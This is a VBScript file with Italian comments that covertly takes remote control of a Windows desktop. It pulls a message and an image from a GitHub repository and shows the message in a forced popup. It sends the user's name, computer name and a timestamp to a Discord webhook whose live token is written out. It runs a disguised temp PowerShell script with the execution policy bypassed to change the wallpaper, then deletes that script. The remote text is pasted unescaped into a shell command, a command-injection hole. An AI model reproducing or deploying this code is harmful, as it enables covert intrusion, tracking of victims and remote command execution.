Option Explicit
On Error Resume Next
 
Dim shell, fso, urlImmagine, urlMessaggio, percorsoLocale, percorsoScript, scriptPS, messaggioDalWeb, xmlHttp
Dim webhookURL, nomeUtente, nomePC
 
' URL ottimizzati per il download diretto
urlImmagine = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"
webhookURL = "https://discord.com/api/webhooks/1460587962629619847/8IK_koKZe-q3-2J_lj6BfhloqM8AnekQpqC_z9VVj0D49-4BaFZqpeSafRjC21KqjgmW"
 
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
 
' Ottieni informazioni sistema
nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%")
nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
 
' --- 1. RECUPERA IL MESSAGGIO ---
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xmlHttp.Open "GET", urlMessaggio, False
xmlHttp.Send
If xmlHttp.Status = 200 Then
    messaggioDalWeb = Trim(xmlHttp.responseText)
End If
 
' --- 2. MOSTRA IL POPUP (Solo se il messaggio non √® vuoto) ---
If messaggioDalWeb <> "" Then
    Dim comandoPopup
    comandoPopup = "powershell -WindowStyle Hidden -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
        "$form = New-Object System.Windows.Forms.Form; $form.Text = 'GEA'; $form.Size = New-Object System.Drawing.Size(400,180); " & _
        "$form.StartPosition = 'CenterScreen'; $form.FormBorderStyle = 'FixedDialog'; $form.ControlBox = $false; $form.TopMost = $true; " & _
        "$label = New-Object System.Windows.Forms.Label; $label.Text = '" & messaggioDalWeb & "'; $label.TextAlign = 'MiddleCenter'; $label.Dock = 'Fill'; " & _
        "$label.Font = New-Object System.Drawing.Font('Segoe UI', 11); " & _
        "$form.Controls.Add($label); $panel = New-Object System.Windows.Forms.Panel; $panel.Dock = 'Bottom'; $panel.Height = 50; " & _
        "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
        "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
    shell.Run comandoPopup, 0, True
    
    ' --- INVIA NOTIFICA DISCORD DOPO IL POPUP ---
    InviaNotificaDiscord webhookURL, nomeUtente, nomePC, messaggioDalWeb
End If
 
' --- 3. CAMBIO SFONDO ---
percorsoLocale = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
percorsoScript = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"
 
' PowerShell scarica l'immagine e forza l'aggiornamento dei parametri di sistema
scriptPS = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
    "(New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocale & "'); " & _
    "if (Test-Path '" & percorsoLocale & "') { " & _
    "$path = (Get-Item '" & percorsoLocale & "').FullName; " & _
    "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $path; " & _
    "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'; " & _
    "$code = @' " & vbCrLf & _
    "using System; using System.Runtime.InteropServices; " & vbCrLf & _
    "public class Wallpaper { [DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); } " & vbCrLf & _
    "'@; Add-Type -TypeDefinition $code; [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x0003); } } catch {}"
 
Dim f
Set f = fso.CreateTextFile(percorsoScript, True)
f.Write scriptPS
f.Close
 
shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoScript & """", 0, True
 
' --- 4. PULIZIA ---
WScript.Sleep 5000
If fso.FileExists(percorsoScript) Then fso.DeleteFile percorsoScript
 
' --- FUNZIONE PER INVIARE NOTIFICA DISCORD ---
Sub InviaNotificaDiscord(webhook, utente, pc, messaggio)
    On Error Resume Next
    Dim http, payload, timestamp
    timestamp = Now()
    
    ' Costruisci il payload JSON
    payload = "{""content"":""üì¢ **Popup visualizzato**""," & _
              """embeds"":[{" & _
              """title"":""Notifica Script""," & _
              """color"":5814783," & _
              """fields"":[" & _
              "{""name"":""üë§ Utente"",""value"":""" & utente & """,""inline"":true}," & _
              "{""name"":""üíª PC"",""value"":""" & pc & """,""inline"":true}," & _
              "{""name"":""üìù Messaggio"",""value"":""" & Replace(messaggio, """", "\""") & """,""inline"":false}," & _
              "{""name"":""üïê Timestamp"",""value"":""" & timestamp & """,""inline"":false}" & _
              "]," & _
              """footer"":{""text"":""Script Execution Log""}" & _
              "}]}"
    
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.Open "POST", webhook, False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send payload
    Set http = Nothing
End Sub
